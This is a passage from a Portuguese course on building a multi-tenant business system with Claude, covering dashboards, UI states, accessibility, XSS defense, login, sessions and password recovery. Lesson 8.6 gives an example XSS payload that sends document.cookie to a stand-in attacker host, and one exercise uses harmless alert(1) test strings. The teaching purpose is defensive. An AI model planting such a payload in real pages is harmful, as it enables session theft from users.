iente, descrição, vencimento, valor, saldo, status (etiqueta colorida), ações.\n- Totalizador no topo, calculado **no servidor** com os mesmos filtros.\n- Ação por linha: \"Registrar pagamento\" (abre o formulário de baixa), \"Enviar lembrete\".\n- Celular: lista de cartões com cliente, valor e status em destaque.\n- Exportar CSV: só dono e gerente, auditado, com proteção contra injeção em planilhas.\n\nPedido ao Claude: cole essa especificação, aponte `@src/app/(app)/clientes/page.tsx` como o padrão a seguir, e peça testes de ponta a ponta para os filtros e para a recusa da exportação ao papel atendente.\n\n> 📌 **Em resumo**\n> - Listas: paginação no servidor, busca, filtros que respondem perguntas reais, estado na URL, totalizadores.\n> - Filtros e ordenação são entrada do usuário: valide e use listas permitidas.\n> - Exportação é ponto de vazamento: restrinja por papel, audite e proteja contra injeção em planilhas.\n> - Siga o padrão de uma tela existente para manter consistência.", "words": 594}, {"id": "m8-5", "title": "Aula 8.4: Painéis e indicadores que o dono entende", "md": "O dono da empresa abre o sistema e quer saber, em 10 segundos: **estou bem ou mal? o que precisa da minha atenção?**. Um painel cheio de gráficos bonitos que não respondem isso é decoração. Esta aula ensina a montar painéis que viram ferramenta de decisão, e que você pode usar como argumento de venda.\n\n### Comece pelas perguntas, não pelos gráficos\n\nNa descoberta (Módulo 4), você ouviu as perguntas do dono. Cada indicador do painel responde **uma** delas:\n\n| Pergunta do dono | Indicador | Forma |\n|---|---|---|\n| \"Quanto vou receber este mês?\" | A receber no mês (previsto × recebido) | Número grande + barra de progresso |\n| \"Quanto está atrasado?\" | Total vencido e número de clientes | Número em destaque, com link para a lista |\n| \"As vendas estão melhores que no mês passado?\" | Vendas ganhas no mês × mês anterior | Número + variação percentual |\n| \"Onde as vendas travam?\" | Oportunidades por etapa do funil | Barras horizontais |\n| \"Quem da equipe está vendendo?\" | Ganhos por vendedor | Tabela ordenada |\n\n### Regras de um bom painel\n\n1. **O resumo vem antes do detalhe.** No topo, 3 a 5 números grandes. Embaixo, gráficos e listas.\n2. **Todo número tem contexto.** \"R$ 42.300\" sozinho não diz nada. \"R$ 42.300 de R$ 60.000 previstos (70%)\" diz.\n3. **Todo número leva a uma lista.** Clicou em \"R$ 8.450 vencidos\", abre a lista das cobranças vencidas, já filtrada.\n4. **Período explícito.** \"Novembro de 2026\", com seletor. E fuso de Brasília (lembra das oportunidades que sumiram na Aula 5.2?).\n5. **Cor com significado.** Vermelho para o que exige ação, verde para o que está bem. Não use cor só para enfeitar.\n6. **Cada papel vê o seu painel.** O dono vê tudo; o gerente vê a sua loja; o vendedor vê as suas metas, nunca o faturamento total, se essa for a regra.\n\n### Os números precisam bater\n\nNada destrói mais a confiança no sistema do que o painel dizer uma coisa e a lista dizer outra. Garanta:\n- O painel e a lista usam **a mesma função de serviço** para calcular (não duas consultas parecidas escritas em lugares diferentes).\n- Testes que conferem: \"o total vencido do painel é igual à soma da lista de vencidos com o mesmo filtro\".\n- Todo cálculo em centavos e no servidor.\n\n### Desempenho\n\nPainéis somam muitos dados. Se ficarem lentos:\n- Índices nas colunas de filtro (Aula 5.6).\n- Cálculos pesados em segundo plano, guardando o resultado (por exemplo, recalcular os indicadores do mês a cada 10 minutos), com a hora da última atualização visível: \"Atualizado às 14h20\".\n\n### Exemplo completo: o painel do Gestor para o dono\n\n```text\n┌──────────────────────────────────────────────────────────────────┐\n│ Novembro de 2026 ▾                          Atualizado às 14h20  │\n├────────────────┬────────────────┬────────────────┬───────────────┤\n│ A receber      │ Vencido        │ Vendas ganhas  │ Ticket médio  │\n│ R$ 42.300      │ R$ 8.450       │ 18             │ R$ 2.350      │\n│ de R$ 60.000   │ 11 clientes →  │ +20% vs out.   │ -5% vs out.   │\n├────────────────┴────────────────┴────────────────┴───────────────┤\n│ Funil de vendas (oportunidades abertas por etapa)                │\n│ Contato       ████████████████ 32                                │\n│ Proposta      ██████████ 20                                      │\n│ Negociação    █████ 9                                            │\n├──────────────────────────────────────────────────────────────────┤\n│ Atenção hoje: 4 cobranças vencem hoje · 6 clientes sem resposta  │\n│ no WhatsApp há mais de 2 horas                                   │\n└──────────────────────────────────────────────────────────────────┘\n```\n\nRepare na última faixa: **\"Atenção hoje\"**. É a parte mais valiosa do painel, porque transforma dados em ação. Ela vem diretamente das dores da descoberta.\n\n> 📌 **Em resumo**\n> - Cada indicador responde a uma pergunta real do dono; comece pelas perguntas.\n> - Resumo antes do detalhe, número com contexto, clique leva à lista, período e fuso explícitos.\n> - Painel e lista usam a mesma função de cálculo, e testes garantem que batem.\n> - Cada papel vê o painel que pode ver.\n\n### Para ir além\n- [web.dev: aprenda acessibilidade (em inglês)](https://web.dev/learn/accessibility): inclui como tornar gráficos e cores legíveis para todos.", "words": 586}, {"id": "m8-6", "title": "Aula 8.5: Carregando, vazio, erro: os estados esquecidos", "md": "O Claude, quando pedido de forma simples, faz a tela do \"caminho feliz\": dados chegaram, tudo certo. Na vida real, a internet da loja cai, a lista está vazia no primeiro dia, o servidor demora. Telas sem esses estados parecem quebradas, e o cliente liga dizendo que \"o sistema travou\".\n\n### Os cinco estados de toda tela\n\n```mermaid\nflowchart LR\n    C[\"Carregando\"] --> D{\"Resultado\"}\n    D -->|\"dados\"| OK[\"Com dados\"]\n    D -->|\"lista vazia\"| V[\"Vazio\"]\n    D -->|\"falhou\"| E[\"Erro\"]\n    D -->|\"sem permissão\"| P[\"Sem acesso\"]\n    E -->|\"tentar de novo\"| C\n```\n*Figura: os cinco estados que toda tela precisa ter. O caminho feliz é só um deles.*\n\n| Estado | O que mostrar | Exemplo no Gestor |\n|---|---|---|\n| **Carregando** | Esqueleto da tela (blocos cinzas no formato do conteúdo) ou indicador discreto | Tabela com linhas cinzas pulsando |\n| **Vazio** | O que aparece aqui + como começar | \"Nenhum cliente ainda. Cadastre o primeiro ou importe de uma planilha.\" |\n| **Vazio por filtro** | Que o filtro não achou nada + como limpar | \"Nenhuma cobrança vencida. 🎉 Limpar filtro\" |\n| **Erro** | O que aconteceu, em linguagem simples + tentar de novo + código | \"Não conseguimos carregar as cobranças. Tentar de novo. Código: req_8f2a1c\" |\n| **Sem acesso** | Que o usuário não tem permissão, sem revelar o conteúdo | \"Esta área é restrita a gerentes.\" |\n\n### Retorno de ações\n\nToda ação precisa de retorno:\n- **Enquanto acontece:** botão com \"Salvando...\" e desabilitado.\n- **Deu certo:** mensagem breve (\"Pagamento registrado\") e a tela atualizada.\n- **Deu errado:** mensagem que diz o que fazer, sem perder o que o usuário digitou.\n\n> ⚠️ **Nunca perca o que o usuário digitou.** Se o envio falhou, o formulário continua preenchido. Perder um formulário longo por causa de uma queda de internet é a forma mais rápida de o usuário odiar o sistema.\n\n### Conexão instável\n\nPequenas empresas têm internet ruim. Cuidados:\n- Requisições com tempo limite e mensagem clara (\"A conexão está lenta. Tentando de novo...\").\n- Para operações críticas, a chave de idempotência (Aula 8.2) permite tentar de novo com segurança.\n- Aviso quando o navegador está sem internet (\"Você está sem conexão. As alterações não foram salvas.\").\n\n### No Next.js: arquivos especiais\n\nO Next.js tem arquivos que cuidam desses estados por pasta de rota:\n- `loading.tsx`: mostrado enquanto a página carrega.\n- `error.tsx`: mostrado quando algo falha na página (com botão de tentar de novo).\n- `not-found.tsx`: para \"não encontrado\" (inclusive para recursos de outra empresa, que respondem 404).\n\nPeça ao Claude que toda pasta de rota principal tenha os três.\n\n### Exemplo completo: a lista de conversas do WhatsApp\n\n| Estado | Tela |\n|---|---|\n| Carregando | 6 linhas-esqueleto com avatar redondo e duas linhas de texto |\n| Vazio (WhatsApp não conectado) | \"Conecte o WhatsApp da empresa para ver as conversas aqui. Conectar\" (só para o dono) |\n| Vazio (conectado, sem conversas) | \"Nenhuma conversa ainda. Quando um cliente mandar mensagem, ela aparece aqui.\" |\n| Vazio por filtro \"não respondidas\" | \"Todas as conversas foram respondidas. 👏\" |\n| Erro | \"Não conseguimos carregar as conversas. Tentar de novo.\" |\n| Sem acesso | Atendente vê só as conversas atribuídas a ela; a lista de \"todas\" mostra \"Disponível para gerentes\" |\n\n> 📌 **Em resumo**\n> - Toda tela tem cinco estados: carregando, com dados, vazio, erro e sem acesso.\n> - O vazio ensina o próximo passo; o erro diz o que fazer e dá um código para o suporte.\n> - Toda ação dá retorno, e o que o usuário digitou nunca se perde.\n> - Use `loading.tsx`, `error.tsx` e `not-found.tsx` em todas as rotas principais.", "words": 553}, {"id": "m8-7", "title": "Aula 8.6: Celular, acessibilidade e segurança no navegador", "md": "A vendedora usa o sistema no celular, no meio da loja. O dono tem 62 anos e usa letra grande. E um cliente mal-intencionado pode tentar cadastrar um \"nome\" que é, na verdade, um script. Esta aula fecha a qualidade da interface com três frentes que o iniciante esquece.\n\n### Celular primeiro\n\nEm pequenas empresas brasileiras, boa parte do uso é pelo celular. Regras:\n- **Teste no celular de verdade**, não só no navegador do computador.\n- Tabelas largas viram **cartões** no celular.\n- Botões e áreas de toque com pelo menos 44 × 44 pixels.\n- Campos com o teclado certo: `type=\"tel\"` para telefone, `inputMode=\"decimal\"` para valores, `type=\"email\"` para e-mail.\n- Nada de rolagem horizontal da página.\n\n### Acessibilidade: para todos, e é lei\n\n**Acessibilidade** é garantir que pessoas com deficiência (visual, motora, auditiva, cognitiva) consigam usar o sistema. Também beneficia todos: idosos, quem está no sol, quem usa só uma mão. No Brasil, a Lei Brasileira de Inclusão (Lei 13.146/2015) trata de acessibilidade, inclusive em sites. O padrão técnico internacional é o **WCAG**.\n\nO essencial:\n| Item | Como |\n|---|---|\n| Contraste | Texto legível sobre o fundo (os componentes do shadcn/ui ajudam; confira cores personalizadas) |\n| Teclado | Tudo funciona com Tab e Enter; o foco é visível |\n| Rótulos | Todo campo tem rótulo associado; todo botão de ícone tem nome (\"Excluir cliente\") |\n| Cor não é a única informação | \"Vencido\" escrito, não só a cor vermelha |\n| Texto ampliável | O layout aguenta o usuário aumentar a fonte do celular |\n| Mensagens de erro | Lidas por leitores de tela (atributos `aria` corretos) |\n\nPeça ao Claude: *\"revise esta tela quanto a acessibilidade (WCAG nível AA): contraste, navegação por teclado, rótulos, foco visível e mensagens de erro. Liste os problemas e corrija\"*. O Playwright também consegue rodar verificações automáticas de acessibilidade.\n\n### Segurança no navegador: XSS\n\n**XSS** (cross-site scripting) acontece quando o sistema mostra, como código, um texto que um usuário digitou. Exemplo: alguém cadastra um cliente com o nome:\n\n```text\n<img src=x onerror=\"fetch('https://atacante.com/?c='+document.cookie)\">\n```\n\nSe a tela inserir esse texto como HTML, o navegador de **quem abrir a lista** (o dono, por exemplo) executa o script, que pode roubar a sessão ou fazer ações em nome dele.\n\nDefesas:\n1. **O React já protege** quando você mostra texto normalmente (`{cliente.nome}`): ele trata o conteúdo como texto, não como HTML.\n2. **O perigo é `dangerouslySetInnerHTML`** (o nome já avisa). Se o Claude usar isso para mostrar algo digitado por usuário, é alerta vermelho. Se for realmente necessário mostrar HTML (por exemplo, o corpo formatado de um e-mail), use uma biblioteca de **sanitização** (como DOMPurify) que remove scripts.\n3. **Links:** um usuário pode cadastrar o \"site\" como `javascript:...`. Valide que URLs começam com `https://`.\n4. **Cookies de sessão** com `HttpOnly` (o JavaScript não lê), `Secure` e `SameSite` (Módulo 9).\n5. **Content Security Policy** (Módulo 13): um cabeçalho que diz ao navegador de onde scripts podem vir, uma camada extra.\n\n### Outros cuidados no navegador\n\n| Risco | Cuidado |\n|---|---|\n| Dados sensíveis guardados no navegador | Não guarde tokens nem dados pessoais em `localStorage`; a sessão fica em cookie `HttpOnly` |\n| Dados na URL | Não coloque CPF, e-mail ou tokens na URL (ficam no histórico, em logs e em capturas de tela) |\n| Código-fonte exposto | Lembre que tudo de componentes de cliente é público; nada de regras secretas ou chaves |\n| Bibliotecas de terceiros no navegador | Cada script externo (chat, analytics) pode ler a página; use o mínimo e só de fornecedores confiáveis |\n| Computador compartilhado na loja | Sessão que expira por inatividade, botão \"sair\" visível |\n\n### Exemplo completo: revisão final da interface do Gestor\n\nAntes de fechar o módulo, rode uma revisão em sessão nova do Claude:\n\n```text\nRevise todas as telas em src/app/(app) quanto a:\n1. Segurança no navegador: uso de dangerouslySetInnerHTML, URLs de usuário sem\n   validação, dados sensíveis passados a componentes de cliente, uso de\n   localStorage para dados sensíveis, dados pessoais em URLs.\n2. Estados: cada rota principal tem loading, error e not-found?\n3. Celular: tabelas viram cartões? Há rolagem horizontal?\n4. Acessibilidade WCAG AA: contraste, teclado, rótulos, foco, cor como única informação.\nListe os problemas por arquivo, com gravidade. Não altere nada.\n```\n\n> 📌 **Em resumo**\n> - Celular primeiro: cartões no lugar de tabelas, toques grandes, teclado certo, teste no aparelho.\n> - Acessibilidade (WCAG AA) beneficia todos e tem respaldo legal.\n> - XSS: o React protege texto normal; `dangerouslySetInnerHTML` com conteúdo de usuário é proibido sem sanitização; valide URLs.\n> - Nada sensível em `localStorage` nem na URL; sessão em cookie `HttpOnly`.\n\n### Para ir além\n- [web.dev: acessibilidade (em inglês)](https://web.dev/learn/accessibility)\n- [Content Security Policy (MDN, em inglês)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)", "words": 772}, {"id": "m8-8", "title": "Exercícios", "md": "### Exercício 1: Caça ao vazamento no navegador (40 min)\n**Objetivo:** ver o que vai para o navegador.\n1. Abra a tela de clientes do Gestor no navegador.\n2. Aperte F12 → aba Rede. Recarregue. Procure as respostas que contêm os dados.\n3. Liste todos os campos que chegam ao navegador. Algum não é usado pela tela? Algum é sensível?\n4. Peça ao Claude para reduzir aos campos necessários e confira de novo.\n\n<details>\n<summary><strong>Resolução comentada<\/strong><\/summary>\n\nÉ comum encontrar campos como `criadoPorId`, `empresaId`, `excluidoEm`, `atualizadoEm` e, em telas de usuários, até o hash da senha ou tokens, quando o código passa objetos inteiros do banco. Nenhum deles é usado pela tela. `empresaId` e ids internos não são segredos graves, mas revelam estrutura; hash de senha e tokens são graves. A correção é usar `select` no serviço com só os campos exibidos e passar props mínimas aos componentes de cliente. Depois da correção, a resposta deve conter apenas o que aparece na tela.\n<\/details>\n\n### Exercício 2: Formulário à prova de pressa (60 min)\nImplemente o formulário de nova cobrança da Aula 8.2 e escreva um teste de ponta a ponta que clica duas vezes em \"Gerar cobrança\" rapidamente e confirma que só uma foi criada.\n\n### Exercício 3: Filtros na URL (45 min)\nNa lista de contas a receber, faça os filtros ficarem na URL. Teste: aplique um filtro, copie o link, abra em outra aba logado com outro usuário da **mesma** empresa (deve ver o mesmo) e com um usuário de **outra** empresa (deve ver só os dados dele, nunca os da primeira).\n\n### Exercício 4: Painel que responde (60 min)\nDesenhe (papel ou wireframe) o painel do gerente e o do atendente do Gestor, partindo de 3 perguntas que cada um faria. Implemente o do dono, com teste que confere que o total vencido do painel bate com a soma da lista.\n\n### Exercício 5: Tente um XSS (30 min)\nCadastre no Gestor (local) um cliente com nome `<img src=x onerror=alert(1)>` e um site `javascript:alert(1)`. Abra a lista e o cadastro. Algum alerta apareceu? Se sim, encontre o trecho responsável e corrija. Se não, explique por que o React protegeu e onde ele **não** protegeria.", "words": 371}, {"id": "m8-9", "title": "Tarefa de campo", "md": "**Teste de usabilidade com uma pessoa real.** Mostre o Gestor (ou o wireframe do caso real) a alguém do perfil do usuário (uma vendedora, um gerente, você mesmo na sua operação). Dê 3 tarefas (\"cadastre um cliente\", \"descubra quanto está vencido\", \"registre um pagamento\") e **observe sem ajudar**. Anote onde a pessoa hesitou, errou ou perguntou. Corrija os 3 problemas mais graves.", "words": 62}, {"id": "m8-10", "title": "Entregável: Interface completa do Gestor", "md": "**Checklist de qualidade:**\n- [ ] Telas: painel, clientes, funil, contas a receber e a pagar, configurações.\n- [ ] Componentes de negócio reutilizáveis (`CampoMoeda`, `ValorComStatus`, etc.).\n- [ ] Formulários com schema compartilhado, erros por campo e proteção contra envio duplo.\n- [ ] Listas paginadas no servidor, filtros na URL validados, totalizadores.\n- [ ] Exportação restrita, auditada e protegida contra injeção em planilhas.\n- [ ] Painel do dono com indicadores que batem com as listas (teste).\n- [ ] Toda rota principal com `loading`, `error` e `not-found`.\n- [ ] Funciona no celular, sem rolagem horizontal.\n- [ ] Revisão de acessibilidade feita e problemas graves corrigidos.\n- [ ] Nenhum `dangerouslySetInnerHTML` com conteúdo de usuário; URLs validadas.\n- [ ] Componentes de cliente recebem só os campos necessários.", "words": 101}, {"id": "m8-11", "title": "Autoavaliação", "md": "Meta: 8 de 10.\n\n1. Qual a diferença entre componente de servidor e de cliente, e qual deles pode acessar o banco?\n2. Por que passar o objeto `usuario` inteiro para um componente de cliente é perigoso?\n3. Como impedir que um duplo clique crie duas cobranças? Cite três camadas.\n4. Por que os filtros devem ficar na URL, e que cuidado de segurança isso exige?\n5. Cite três cuidados na função \"exportar para Excel\".\n6. O painel diz \"R$ 8.450 vencidos\" e a lista soma R$ 8.120. Qual a causa provável e como evitar?\n7. Quais são os cinco estados de uma tela?\n8. O que é XSS? Quando o React não protege?\n9. Por que não guardar o token de sessão em `localStorage`?\n10. Cite 3 requisitos de acessibilidade que você confere em toda tela.\n\n<details>\n<summary><strong>Gabarito<\/strong><\/summary>\n\n1. O de servidor roda no servidor, pode acessar o banco e segredos, e envia só HTML ao navegador. O de cliente roda no navegador, cuida de interação e vai inteiro como código para o usuário. Só o de servidor pode acessar o banco.\n2. Porque tudo passado como prop para um componente de cliente é enviado ao navegador e fica visível (F12), inclusive campos sensíveis como hash de senha e tokens.\n3. Botão desabilitado durante o envio; chave de idempotência enviada com o formulário; restrição de unicidade no banco quando houver uma natural.\n4. Para o link poder ser salvo, compartilhado e o botão voltar funcionar. Como a URL é entrada do usuário, os filtros precisam ser validados (valores permitidos, limites) e a ordenação só aceita colunas de uma lista permitida.\n5. Restringir por papel; respeitar o empresaId e os filtros; registrar na auditoria; excluir colunas sensíveis desnecessárias; proteger contra injeção em planilhas.\n6. Painel e lista calculam com consultas ou regras diferentes (filtro de data, fuso, baixas parciais). Evite usando a mesma função de serviço para os dois e um teste que compara os resultados.\n7. Carregando, com dados, vazio, erro e sem acesso.\n8. É a execução, no navegador de outra pessoa, de um script inserido como texto por um usuário. O React não protege quando se usa `dangerouslySetInnerHTML` com conteúdo de usuário, nem em URLs `javascript:` em links.\n9. Porque qualquer script que rode na página (inclusive um XSS ou uma biblioteca de terceiros comprometida) consegue ler o `localStorage`. Em cookie `HttpOnly`, o JavaScript não tem acesso.\n10. Contraste legível; navegação completa por teclado com foco visível; rótulos em todos os campos e botões de ícone; cor não ser a única forma de informação; layout que aguenta fonte ampliada.\n<\/details>", "words": 439}, {"id": "m8-12", "title": "Checklist de segurança do módulo", "md": "- [ ] Componentes de cliente recebem só campos necessários; serviços usam `select`.\n- [ ] Arquivos compartilhados com o frontend não importam nada sensível.\n- [ ] Filtros e ordenação validados com listas permitidas.\n- [ ] Exportações restritas, auditadas e protegidas contra injeção em planilhas.\n- [ ] Nenhum `dangerouslySetInnerHTML` com conteúdo de usuário sem sanitização.\n- [ ] URLs digitadas por usuários validadas (`https://`).\n- [ ] Nada sensível em `localStorage` nem em URLs.\n- [ ] Ações destrutivas com confirmação explícita.", "words": 61}, {"id": "m8-13", "title": "Para aprofundar (opcional)", "md": "| Material | Formato | Por que vale |\n|---|---|---|\n| [Aprenda React](https://react.dev/learn) | Texto, em inglês | A base de tudo no frontend |\n| [Curso oficial do Next.js](https://nextjs.org/learn) | Curso gratuito, em inglês | Construção guiada de um painel completo |\n| [Acessibilidade no web.dev](https://web.dev/learn/accessibility) | Curso gratuito, em inglês | Acessibilidade na prática |", "words": 55}]}, {"id": "m9", "file": "modulo-09-login-permissoes-multitenant.md", "short": "M9", "title": "Módulo 9: Login, permissões e multi-tenant", "meta": "Semanas 17 e 18 · cerca de 24 horas", "group": "Fase 3 · Construindo o sistema", "lessons": [{"id": "m9-1", "title": "Objetivos de aprendizagem", "md": "Este é o módulo que mais diretamente responde ao seu medo de vazar dados. Quase todo vazamento grave em sistemas de pequenas e médias empresas cai em uma de três categorias: **alguém entrou como outra pessoa** (falha de autenticação), **alguém viu o que não podia** (falha de autorização) ou **uma empresa viu os dados de outra** (falha de isolamento). Neste módulo você aprende a fechar as três portas, e a **provar** com testes que estão fechadas.\n\nAo final deste módulo você será capaz de:\n1. Explicar como senhas, hashes, sessões e cookies funcionam, e configurá-los com segurança.\n2. Implementar 2FA, recuperação de senha segura e proteção contra tentativas em massa.\n3. Desenhar papéis e permissões (RBAC) e aplicá-los no servidor.\n4. Escolher a estratégia de multi-tenant e isolar os dados de cada empresa em todas as consultas.\n5. Adicionar isolamento no próprio banco (RLS) como camada extra e testar o isolamento de forma sistemática.\n6. Gerenciar o ciclo de vida dos usuários: convite, troca de papel, desligamento e acesso de suporte.\n\n### Como estudar este módulo\n```mermaid\nflowchart LR\n    A[\"Aulas 9.1 e 9.2<br/>autenticação\"] --> B[\"Aula 9.3<br/>autorização\"]\n    B --> C[\"Aulas 9.4 e 9.5<br/>multi-tenant e isolamento\"]\n    C --> D[\"Aula 9.6<br/>ciclo de vida\"]\n    D --> EN[\"Entregável: Gestor<br/>multi-empresa com papéis\"]\n    EN --> AV[\"Autoavaliação\"]\n```\n*Figura: as três portas (quem é, o que pode, de qual empresa) e o ciclo de vida dos usuários.*\n\n| Semana | O que fazer | Horas |\n|---|---|---|\n| 17 | Aulas 9.1 a 9.3, exercícios 1 a 3 | 12 |\n| 18 | Aulas 9.4 a 9.6, exercícios 4 e 5, tarefa, entregável, autoavaliação | 12 |", "words": 281}, {"id": "m9-2", "title": "Aula 9.1: Autenticação: senhas, sessões e cookies", "md": "**Autenticação** responde \"quem é você?\". **Autorização** responde \"o que você pode fazer?\". Iniciantes confundem as duas e acham que \"tem login\" significa \"está seguro\". Esta aula trata da primeira, com o cuidado que ela merece: um erro aqui entrega o sistema inteiro.\n\n### Senhas: nunca guarde a senha\n\nO sistema **nunca** guarda a senha do usuário. Guarda o resultado de um **hash**: uma função que transforma a senha em um código, de forma que:\n- A mesma senha sempre gera o mesmo resultado (para conferir no login).\n- É impossível, na prática, voltar do resultado para a senha.\n- Cada usuário tem um **sal** (salt) aleatório misturado à senha, para que duas pessoas com a mesma senha tenham hashes diferentes.\n\n```mermaid\nflowchart LR\n    S[\"Senha digitada<br/>'Padaria@2026'\"] --> H[\"Algoritmo de hash lento<br/>(Argon2id / bcrypt / scrypt)<br/>+ sal aleatório\"]\n    H --> G[\"Guardado no banco<br/>'$argon2id$v=19$m=...'\"]\n    L[\"No login: senha digitada\"] --> H2[\"Mesmo algoritmo<br/>+ mesmo sal\"]\n    H2 --> C{\"Resultado igual<br/>ao guardado?\"}\n    C -->|\"Sim\"| OK[\"Entra\"]\n    C -->|\"Não\"| NO[\"Recusa\"]\n```\n*Figura: o sistema compara hashes, nunca senhas. Se o banco vazar, o atacante tem só os hashes, que são caros de quebrar.*\n\nUse **algoritmos feitos para senhas**, que são propositalmente lentos (para dificultar tentativas em massa): **Argon2id**, **scrypt** ou **bcrypt**. Nunca MD5, SHA-1 ou SHA-256 puros: são rápidos demais. A biblioteca de login (Better Auth) já faz isso; seu trabalho é **conferir** e nunca deixar o Claude \"simplificar\".\n\n### Regras de senha modernas\n\nAs recomendações atuais (por exemplo, do NIST, órgão de padrões dos EUA, referência mundial) mudaram em relação ao que muita gente pratica:\n\n| Antigo (evite) | Atual (faça) |\n|---|---|\n| Exigir maiúscula, número e símbolo | Exigir **comprimento** (mínimo de 8; recomendável 12 ou mais) |\n| Trocar a senha a cada 90 dias | Trocar só quando houver suspeita de vazamento |\n| Proibir colar a senha | Permitir colar (facilita gerenciadores de senha) |\n| Dica de senha, pergunta secreta | Nunca |\n| | Recusar senhas conhecidas por vazamentos e óbvias (\"12345678\", \"nome da empresa\") |\n\n### Sessão: como o sistema lembra que você entrou\n\nDepois do login, o servidor cria uma **sessão** e entrega ao navegador um identificador dela, guardado em um **cookie**. A cada requisição, o navegador manda o cookie, e o servidor sabe quem é.\n\nDuas formas comuns:\n\n| | Sessão no banco | Token assinado (JWT) |\n|---|---|---|\n| Onde fica a informação | No banco; o cookie só tem um id aleatório | Dentro do próprio token, assinado |\n| Revogar (desligar um usuário agora) | Fácil: apaga a sessão | Difícil: o token vale até expirar |\n| Padrão desta formação | **Sim** (o Better Auth usa sessões no banco) | Só em casos específicos |\n\n> 🎯 **Por que isso importa para você:** quando o cliente demitir um funcionário às 10h, ele precisa perder o acesso às 10h, não \"quando o token expirar amanhã\". Sessão no banco permite isso.\n\n### O cookie de sessão bem configurado\n\n| Atributo | Faz | Configuração |\n|---|---|---|\n| `HttpOnly` | O JavaScript da página não consegue ler o cookie (protege contra XSS roubar a sessão) | Sempre |\n| `Secure` | Só é enviado por HTTPS | Sempre em produção |\n| `SameSite=Lax` | Não é enviado em requisições vindas de outros sites (protege contra CSRF) | Padrão |\n| Expiração | Sessão expira por inatividade e por tempo máximo | Ex.: 12 horas de inatividade, 30 dias no máximo, conforme o risco |\n\n**CSRF** (falsificação de requisição entre sites) é quando um site malicioso faz o navegador do usuário logado enviar uma ação para o seu sistema (\"transfira\", \"exclua\"). `SameSite`, a verificação da origem da requisição e as proteções do framework cobrem a maior parte dos casos.\n\n### Mensagens de erro do login\n\n| Ruim | Bom |\n|---|---|\n| \"Usuário não encontrado\" / \"Senha incorreta\" | \"E-mail ou senha incorretos\" |\n\nMensagens diferentes permitem a um atacante descobrir quais e-mails têm conta (**enumeração de usuários**). O mesmo vale para \"esqueci minha senha\": responda sempre \"Se o e-mail estiver cadastrado, você receberá as instruções\".\n\n### Exemplo completo: configurando o login do Gestor\n\n```text\nConfigure o Better Auth no Gestor conforme a documentação oficial atual.\n\nRequisitos:\n- Login por e-mail e senha; sessões guardadas no banco (PostgreSQL via Prisma).\n- Senha: mínimo de 10 caracteres, recusar as 10 mil senhas mais comuns; permitir colar.\n- Hash: o padrão seguro da biblioteca (confirme qual é e me diga).\n- Cookie: HttpOnly, Secure em produção, SameSite=Lax.\n- Sessão: expira após 12 horas sem uso e no máximo em 30 dias.\n- Mensagens genéricas no login e na recuperação.\n- BETTER_AUTH_SECRET longo e aleatório, só em variável de ambiente.\n\nTestes: login certo cria sessão; senha errada → mensagem genérica; senha curta\nrecusada no cadastro; sessão expirada → 401; logout apaga a sessão no banco.\n```\n\n> 📌 **Em resumo**\n> - Nunca guarde senhas: guarde hashes de algoritmos lentos (Argon2id, scrypt, bcrypt), feitos pela biblioteca.\n> - Senhas: comprimento acima de regras de símbolo; recusar senhas comuns; sem troca periódica forçada.\n> - Sessões no banco permitem desligar um usuário na hora; cookie `HttpOnly`, `Secure`, `SameSite`.\n> - Mensagens genéricas evitam revelar quais e-mails têm conta.\n\n### Para ir além\n- [Guia de autenticação da OWASP (em inglês)](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)\n- [Guia de armazenamento de senhas da OWASP (em inglês)](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n- [Guia de gerenciamento de sessões da OWASP (em inglês)](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)", "words": 843}, {"id": "m9-3", "title": "Aula 9.2: 2FA, recuperação de senha e ataques em massa", "md": "Senhas vazam: o usuário usa a mesma senha em vários sites, um deles é invadido, e a lista vai parar na internet. Robôs testam essas listas em milhares de sistemas, inclusive no seu. Esta aula adiciona as camadas que fazem uma senha vazada não ser suficiente para invadir.\n\n### Segundo fator (2FA)\n\nO **2FA** (autenticação em dois fatores) exige, além da senha, algo que só o usuário tem:\n\n| Método | Segurança | Observação |\n|---|---|---|\n| **App autenticador** (códigos de 6 dígitos que mudam a cada 30 s, padrão TOTP) | Alta | Padrão recomendado; funciona sem internet no celular |\n| **Chave de acesso (passkey) ou chave física** | Muito alta | Resistente a páginas falsas (phishing); cada vez mais suportada |\n| **Código por e-mail** | Média | Melhor que nada; depende da segurança do e-mail |\n| **Código por SMS** | Baixa a média | Vulnerável a clonagem de chip; evite para contas críticas |\n\nPolítica recomendada para o Gestor:\n- **Obrigatório** para o papel dono (que controla a assinatura, os usuários e exporta dados).\n- **Recomendado** (com lembrete) para os demais.\n- **Códigos de recuperação**: ao ativar o 2FA, o usuário recebe 10 códigos de uso único para o caso de perder o celular.\n\n### Recuperação de senha sem abrir uma porta\n\n\"Esqueci minha senha\" é uma das portas mais atacadas. O fluxo seguro:\n\n```mermaid\nsequenceDiagram\n    participant U as Usuário\n    participant G as Gestor\n    participant E as E-mail\n    U->>G: esqueci a senha (e-mail)\n    G->>G: gera token aleatório, guarda só o hash, validade 30 min\n    G-->>U: \"Se o e-mail existir, você receberá instruções\"\n    G->>E: link com o token\n    U->>G: abre o link, define nova senha\n    G->>G: confere hash e validade, troca a senha, invalida o token\n    G->>G: encerra todas as outras sessões do usuário\n    G->>E: aviso \"sua senha foi alterada\"\n```\n*Figura: recuperação de senha segura. O token é de uso único e curto, as outras sessões são encerradas e o usuário é avisado da troca.*\n\n| Regra | Por quê |\n|---|---|\n| Token longo e aleatório, guardado como hash | Se o banco vazar, os tokens não servem |\n| Validade curta (15 a 60 minutos) e uso único | Limita a janela de ataque |\n| Resposta igual existindo ou não o e-mail | Evita enumeração |\n| Encerrar as outras sessões após a troca | Se alguém tinha invadido, perde o acesso |\n| Avisar por e-mail que a senha mudou | O dono legítimo percebe se não foi ele |\n| Não fazer login automático após o link, se houver 2FA | Senão, quem tem o e-mail pula o 2FA |\n\n### Ataques em massa e limite de tentativas\n\nDois ataques comuns ao login:\n- **Força bruta:** muitas senhas para um mesmo usuário.\n- **Preenchimento de credenciais** (credential stuffing): listas de e-mail e senha vazadas de outros sites, testadas em massa.\n\nDefesas, em camadas:\n1. **Limite de tentativas** (rate limit) por conta e por endereço IP: por exemplo, 5 tentativas erradas por conta em 15 minutos, com espera 